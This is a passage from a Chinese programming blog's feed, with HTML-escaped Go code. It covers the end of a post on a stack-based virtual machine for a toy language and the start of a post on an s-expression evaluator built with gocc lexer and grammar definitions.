&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">UInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nf">UInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Location&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;invalid Procedure object&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;invalid CALL instruction operand %v&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">MiniVM&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">instRet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span> &lt;span class="nx">Instruction&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;invalid RET instruction: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">returnAddress&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Pop&lt;/span>&lt;span class="p">().(&lt;/span>&lt;span class="nx">UInt&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">returnAddress&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">MiniVM&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">instPush&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span> &lt;span class="nx">Instruction&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;invalid PUSH instruction: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">MiniVM&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">instPop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span> &lt;span class="nx">Instruction&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;invalid POP instruction: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Pop&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">MiniVM&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">instLoad&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span> &lt;span class="nx">Instruction&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;invalid LOAD instruction: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].(&lt;/span>&lt;span class="nx">Symbol&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Locals&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">)];&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;undefined name %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unexpected operand for instruction LOAD %v(%T)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Operand&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">MiniVM&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">ExecNextInstruction&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Instructions&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">ErrNoMoreInstructions&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">inst&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Instructions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">OpCode&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">CALL&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">instCall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">RET&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">instRet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">PUSH&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">instPush&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">POP&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">instPop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">LOAD&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">instLoad&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inst&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unexpected opcode %v&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">OpCode&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">IP&lt;/span>&lt;span class="o">++&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x04-结果展示">0x04 结果展示&lt;/h2>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/stack-based-virtual-machine-for-minilang/image-20211213160751960.png"
width="154"
height="56"
srcset="https://nnnewb.github.io/blog/blog/p/stack-based-virtual-machine-for-minilang/image-20211213160751960_hub5ba10952ea39a099fde4f51e1c00d4b_2964_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/stack-based-virtual-machine-for-minilang/image-20211213160751960_hub5ba10952ea39a099fde4f51e1c00d4b_2964_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211213160751960"
class="gallery-image"
data-flex-grow="275"
data-flex-basis="660px"
>&lt;/p>
&lt;p>PS：这个 &lt;code>+&lt;/code> 也是函数。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这个简单的 VM 写的时候脑子里想的都是 x86 汇编和 Python 的类型，所以内置类型定义就很粗暴，指令 OpCode 定义也是想当然。写成这样当然还是不满意的，都费了这么大劲了，简简单单做个 JIT 不过分吧？&lt;/p>
&lt;p>但讲老实的，我还真不知道不用 CGO 的情况下，我就算是拿 &lt;code>syscall&lt;/code> 这个包分配好了读写执行的空间也成功汇编出了机器码，也不知道怎么去调 Go 里定义的函数和数据结构。这一点看，要是一开始拿 C 写的话，问题就会好解决很多：够底层嘛，不用担心移植性和运行时的封装。&lt;/p>
&lt;p>不过也不是真的一点办法也没有，干脆把内建类型和函数全部拿 C 或者 minilang 自己实现就好了，定义好数据结构，minilang 编译出来的指令全是调用自己或者调用C函数，再想翻译到汇编指令就简单很多了。到了这一步，直接拿 minilang 写一个编译自己的编译器也不是不行。&lt;/p></description></item><item><title>一个s表达式求值器</title><link>https://nnnewb.github.io/blog/p/a-s-exp-evaluator/</link><pubDate>Thu, 09 Dec 2021 17:11:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/a-s-exp-evaluator/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>翻没看过的藏书的时候找出一本《SICP》的 PDF（PS：已经买了正版书），想起曾经拿 Rust 写玩具解释器，结果现在连 Rust 本身都已经快忘光了。&lt;/p>
&lt;p>所以就当怀旧，写个很简单的玩具，s表达式求值器。&lt;/p>
&lt;h2 id="技术栈">技术栈&lt;/h2>
&lt;p>语言选择了 Go，用 gocc 生成 Parser/Lexer 。虽然说手写+调试 Lexer/Parser 也是挺快乐的，但毕竟只是怀旧重温下当年愣头青的自己，不想花太多时间。&lt;/p>
&lt;h2 id="词法定义">词法定义&lt;/h2>
&lt;p>简单解释下 gocc 定义词法元素的 DSL 是怎么回事。gocc 的这个 DSL 是类似于 EBNF 的语法（自称）， &lt;code>_letter: 'a'-'z'&lt;/code> 就是一条产生式，&lt;code>:&lt;/code>前面是产生式的名称，后面是模式。&lt;/p>
&lt;p>产生式名称也有特殊含义。&lt;/p>
&lt;ul>
&lt;li>&lt;code>!&lt;/code> 开头的产生式会被 Lexer 忽略。&lt;/li>
&lt;li>&lt;code>_&lt;/code> 开头的产生式叫做 &lt;code>regDefId&lt;/code>，可以理解成给后面的模式定义的别名。&lt;/li>
&lt;li>&lt;code>a-z&lt;/code>小写字母开头的是 &lt;code>token&lt;/code>，也就是一般说的词法元素定义了。&lt;/li>
&lt;/ul>
&lt;p>值得注意的是 &lt;code>token&lt;/code> 不能被用作其他词法元素产生式的模式部分，但 &lt;code>regDefId&lt;/code> 可以，所以要注意要复用的规则应该定义成下划线开头。&lt;/p>
&lt;p>比如说下面的例子。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">// example 1
letter: &amp;#39;a&amp;#39;-&amp;#39;z&amp;#39;;
identifier: letter; // Error!
// example 2
_letter: &amp;#39;a&amp;#39;-&amp;#39;z&amp;#39;;
identifier: _letter; // OK
&lt;/code>&lt;/pre>&lt;/div>&lt;p>下面是求值器的词法元素定义。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">!whitespace: &amp;#39; &amp;#39; | &amp;#39;\t&amp;#39; | &amp;#39;\r&amp;#39; | &amp;#39;\n&amp;#39;;
!comment: &amp;#39;;&amp;#39; {.} &amp;#39;\n&amp;#39;;
//
// identifier
//
_letter : &amp;#39;a&amp;#39;-&amp;#39;z&amp;#39; | &amp;#39;A&amp;#39;-&amp;#39;Z&amp;#39;;
_initial: _letter;
_digit : &amp;#39;0&amp;#39;-&amp;#39;9&amp;#39; ;
_special_subsequent : &amp;#39;.&amp;#39; | &amp;#39;+&amp;#39; | &amp;#39;-&amp;#39; | &amp;#39;!&amp;#39; | &amp;#39;?&amp;#39;;
_subsequent: _initial | _digit | _special_subsequent;
_peculiar_identifier: &amp;#39;+&amp;#39; | &amp;#39;-&amp;#39; | &amp;#39;.&amp;#39; &amp;#39;.&amp;#39; &amp;#39;.&amp;#39;;
_identifier : _initial { _subsequent } | _peculiar_identifier;
identifier: _identifier;
quoted_identifier: &amp;#39;#&amp;#39; _identifier;
//
// boolean
//
_boolean_t: &amp;#39;#&amp;#39; &amp;#39;t&amp;#39;;
_boolean_f: &amp;#39;#&amp;#39; &amp;#39;f&amp;#39;;
boolean_t: _boolean_t;
boolean_f: _boolean_f;
//
// string
//
_string_element: &amp;#39;\\&amp;#39; &amp;#39;&amp;#34;&amp;#39; | . | &amp;#39;\\&amp;#39; &amp;#39;\\&amp;#39;;
_string : &amp;#39;&amp;#34;&amp;#39; { _string_element } &amp;#39;&amp;#34;&amp;#39;;
string: _string;
//
// number
//
_sign: &amp;#39;+&amp;#39; | &amp;#39;-&amp;#39;;
_uint10: _digit { _digit };
_ureal10 : [&amp;#39;.&amp;#39;] _uint10 | _uint10 &amp;#39;.&amp;#39; _digit {_digit};
_number : [_sign] _ureal10;
number: _number;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>词法元素很简单，运算符也当成 identifier 处理了，万一要扩展也容易。&lt;/p>
&lt;h2 id="语法定义">语法定义&lt;/h2>
&lt;p>gocc 的语法元素定义和词法元素定义差不多。产生式名称要用大写字母开头，后面跟的元素只能是 &lt;code>token&lt;/code>、语法元素还有字符串字面量。另外就是在每个规则后面可以加上一个 “动作”，用过 flex/bison 的应该知道我说的啥。这个动作是一个表达式，求值后必须是 &lt;code>interface{}, error&lt;/code> 这样的元组。这个求值结果会被 Parser 返回，所以需要在 Action 里就把 AST 组装好。&lt;/p>
&lt;p>另外值得一提的就是语法元素的定义是不支持 &lt;code>[]&lt;/code>、&lt;code>{}&lt;/code> 这样的糖的，所以可选就得自己写成 &lt;code>Opt: Value | empty&lt;/code> ，重复一或多次就得自己写成 &lt;code>Elements: Element | Elements Element&lt;/code> 诸如此类。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">//
// Syntax start here
//
&amp;lt;&amp;lt;
import (
&amp;#34;github.com/nnnewb/minilang/pkg/ast&amp;#34;
&amp;#34;github.com/nnnewb/minilang/pkg/bnf/token&amp;#34;
)
&amp;gt;&amp;gt;
//
// value
//
Value
: identifier &amp;lt;&amp;lt; ast.Identifier(string($0.(*token.Token).Lit)), nil &amp;gt;&amp;gt;
| quoted_identifier &amp;lt;&amp;lt; ast.NewQuoted(ast.Identifier(string($0.(*token.Token).Lit[1:]))), nil &amp;gt;&amp;gt;
| boolean_t &amp;lt;&amp;lt; ast.Boolean(true), nil &amp;gt;&amp;gt;
| boolean_f &amp;lt;&amp;lt; ast.Boolean(false), nil &amp;gt;&amp;gt;
| number &amp;lt;&amp;lt; ast.NewNumber(string($0.(*token.Token).Lit)) &amp;gt;&amp;gt;
| string &amp;lt;&amp;lt; ast.String(string($0.(*token.Token).Lit)), nil &amp;gt;&amp;gt;
| List &amp;lt;&amp;lt; $0, nil &amp;gt;&amp;gt;
;
//
// list
//
ListElements
: Value &amp;lt;&amp;lt; ast.NewListWithInitial($0.(ast.Node)), nil &amp;gt;&amp;gt;
| ListElements Value &amp;lt;&amp;lt; $0.(*ast.List).Append($1.(ast.Node)), nil &amp;gt;&amp;gt;
;
List
: &amp;#34;(&amp;#34; ListElements &amp;#34;)&amp;#34; &amp;lt;&amp;lt; $1, nil &amp;gt;&amp;gt;
| &amp;#34;(&amp;#34; &amp;#34;)&amp;#34; &amp;lt;&amp;lt; ast.NewList(), nil &amp;gt;&amp;gt;
| &amp;#34;#(&amp;#34; ListElements &amp;#34;)&amp;#34; &amp;lt;&amp;lt; ast.NewQuoted($1.(ast.Node)), nil &amp;gt;&amp;gt;
| &amp;#34;#(&amp;#34; &amp;#34;)&amp;#34; &amp;lt;&amp;lt; ast.NewQuoted(ast.NewList()), nil &amp;gt;&amp;gt;
;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>s表达式本身就是一个括号括起来的列表，所以语法元素更简单了，直接把词法元素放进去就行。&lt;/p>
&lt;h2 id="解析和执行">解析和执行&lt;/h2>
&lt;h3 id="执行环境">执行环境&lt;/h3>
&lt;p>执行环境就是保存变量（考虑作用域的话还要嵌套）、函数（或者叫 procedure）、解释器内建的函数之类的东西的地方，简单实现成一个 map 就完事了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">ExecutionEnv&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">symbols&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nx">Value&lt;/span>
&lt;span class="nx">parent&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">NewExecutionEnv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">parent&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">symbols&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nx">Value&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">parent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">parent&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">SetValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">val&lt;/span> &lt;span class="nx">Value&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">Value&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">old&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">val&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">old&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">LookupName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">Value&lt;/span> &lt;span class="p">{&lt;/span>
